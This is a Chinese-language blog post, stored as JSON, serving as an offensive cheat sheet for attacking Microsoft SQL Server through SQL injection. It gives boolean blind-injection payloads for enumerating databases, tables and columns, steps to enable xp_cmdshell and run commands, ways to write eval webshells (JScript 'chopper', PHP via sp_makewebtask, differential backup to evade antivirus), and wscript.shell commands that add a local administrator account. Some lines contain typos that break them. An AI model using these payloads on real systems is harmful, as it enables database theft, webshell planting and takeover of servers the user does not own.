{"title":"MSSQL盲注及注入导致getshell的方式","slug":"2019-03-30-MSSQL注入导致getshell的方式","date":"2019-10-18T11:15:38.000Z","updated":"2019-10-18T12:18:21.226Z","comments":true,"excerpt":"","content":"<h5 id=\"SQL-Server盲注\"><a href=\"#SQL-Server盲注\" class=\"headerlink\" title=\"SQL Server盲注\"></a>SQL Server盲注</h5><p>获取第一个数据库：</p>\n<pre><code>and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;= 109\n</code></pre><p>获取所有数据库：</p>\n<pre><code>and ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (&apos;第一个数据库名&apos;, &apos;第二个数据库名&apos;,,,,,,’第N-1个数据库名’)),N,1)) &gt;= 56\n</code></pre><p>获取第一个表：</p>\n<pre><code>and ascii(substring((select top 1 name from sysobjects where xtype = 0x75 ),1,1)) &gt;= 80\n</code></pre><p>获取所有表：</p>\n<pre><code>and ascii(substring((select top 1 name from sysobjects where xtype = 0x75 and name not in (&apos;第一个表名&apos;,&apos;第二个表名&apos;,,,,,,&apos;第N-1个表名&apos;)),N,1)) &gt;= 9\n</code></pre><p>获取第一个列：</p>\n<pre><code>and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&apos;表名&apos;)),N,1)) &gt;= 65\n</code></pre><p>获取所有列：</p>\n<pre><code>and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&apos;表名&apos;) and name not in (&apos;第一个列名&apos;)),N,1)) &gt;= 65\n</code></pre><h5 id=\"xp-cmdshell\"><a href=\"#xp-cmdshell\" class=\"headerlink\" title=\"xp_cmdshell\"></a>xp_cmdshell</h5><h6 id=\"1-开启xp-cmdshell\"><a href=\"#1-开启xp-cmdshell\" class=\"headerlink\" title=\"1.开启xp_cmdshell\"></a>1.开启xp_cmdshell</h6><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1;\nRECONFIGURE;\nEXEC sp_configure &apos;xp_cmdshell&apos;, 1;\nRECONFIGURE;\nexec sp_configure\n</code></pre><h6 id=\"2-xp-cmdshell执行命令\"><a href=\"#2-xp-cmdshell执行命令\" class=\"headerlink\" title=\"2.xp_cmdshell执行命令\"></a>2.xp_cmdshell执行命令</h6><pre><code>exec master..xp_cmdshell &quot;whoami&quot;\n</code></pre><h6 id=\"3-关闭xp-cmdshell\"><a href=\"#3-关闭xp-cmdshell\" class=\"headerlink\" title=\"3.关闭xp_cmdshell\"></a>3.关闭xp_cmdshell</h6><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1\nRECONFIGURE WITH OVERRIDE\nEXEC sp_configure &apos;xp_cmdshell&apos;, 0\nRECONFIGURE WITH OVERRIDE\nEXEC sp_configure   &apos;show advanced options&apos;, 0\nRECONFIGURE WITH OVERRIDE\n</code></pre><h5 id=\"利用xp-cmdshell组件getshell\"><a href=\"#利用xp-cmdshell组件getshell\" class=\"headerlink\" title=\"利用xp_cmdshell组件getshell\"></a>利用xp_cmdshell组件getshell</h5><h6 id=\"查找绝对路径\"><a href=\"#查找绝对路径\" class=\"headerlink\" title=\"查找绝对路径\"></a>查找绝对路径</h6><pre><code>for /r c:\\ %i in (Newslist*.aspx) do @echo %i\nfor /r c:\\ %i in (Newslist.aspx) do @echo %i\n</code></pre><h6 id=\"Getshell\"><a href=\"#Getshell\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h6><pre><code>DOS下遇到&lt;&gt;需要在前面添加^\nexec master.dbo.xp_cmdshell &apos;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%^&gt;^ &gt; D:\\1.txt&apos; \n</code></pre><h5 id=\"差异备份\"><a href=\"#差异备份\" class=\"headerlink\" title=\"差异备份\"></a>差异备份</h5><p>当遇到调用 ‘CreateProcess’ 失败，错误代码: ‘5’时候，有可能是杀毒软件拦截了命令执行，可以差异备份绕过</p>\n<p>创建数据库：</p>\n<pre><code>create database test;\n</code></pre><p>进行第一次备份：</p>\n<pre><code>backup database test to disk = &apos;D:\\www\\test.bak&apos;;\n</code></pre><p>在test数据库创建新表：</p>\n<pre><code>use test;create tabale fanxing(cmd image);        (一定选择image类型)\n</code></pre><p>想数据库插入数据：</p>\n<pre><code>use test;inster into fanxing(cmd) values(0x一句话木马的16进制)；\n</code></pre><p>差异备份：</p>\n<pre><code>backup database test to disk=&apos;D:\\www\\test.aspx&apos; WITH DIFFERENTIAL,FORMAT;\n</code></pre><h5 id=\"sp-makewebtask\"><a href=\"#sp-makewebtask\" class=\"headerlink\" title=\"sp_makewebtask\"></a>sp_makewebtask</h5><p>可用版本：SQL Server 2000</p>\n<p>新建文件：</p>\n<pre><code>exec sp_makewebtask &apos;C:\\test1.php&apos;,&apos; select &apos;&apos;&lt;?php phpinfo();?&gt;&apos;&apos; &apos;;;--\n</code></pre><p>写入shell：</p>\n<pre><code>exec sp_makewebtask &apos;C:\\test1.php&apos;,&apos; select &apos;&apos;&lt;?php @eval($?_POST[&apos;cmd&apos;]);?&gt;&apos;&apos; &apos;;;--\n</code></pre><h5 id=\"wscript-shell添加管理员\"><a href=\"#wscript-shell添加管理员\" class=\"headerlink\" title=\"wscript.shell添加管理员\"></a>wscript.shell添加管理员</h5><p>可用版本：SQL Server 2000/2008</p>\n<p>mssql2008开启：</p>\n<pre><code>exec sp_configure &apos;Web AssistantProcedures&apos;, 1; RECONFIGURE\n</code></pre><p>添加用户：</p>\n<pre><code>declare @shell int exec sp_oacreate &apos;wscript.shell&apos;,@shell output exec sp_oamethod @shell,&apos;run&apos;,null,&apos;c:\\windows\\system32\\cmd.exe /c net user test2 test2 /add&apos;\n</code></pre><p>添加到管理组：</p>\n<pre><code>declare @shell int exec sp_oacreate &apos;wscript.shell&apos;,@shell output exec sp_oamethod @shell,&apos;run&apos;,null,&apos;c:\\windows\\system32\\cmd.exe /c net localgroup administrators test2 /add&apos;\n</code></pre><h5 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h5><p><a href=\"https://www.twblogs.net/a/5bf38bfbbd9eee37a0608e17/zh-cn\" target=\"_blank\" rel=\"noopener\">https://www.twblogs.net/a/5bf38bfbbd9eee37a0608e17/zh-cn</a></p>\n<p><a href=\"https://fuping.site/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/\" target=\"_blank\" rel=\"noopener\">https://fuping.site/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/</a></p>\n","categories":[],"tags":[]}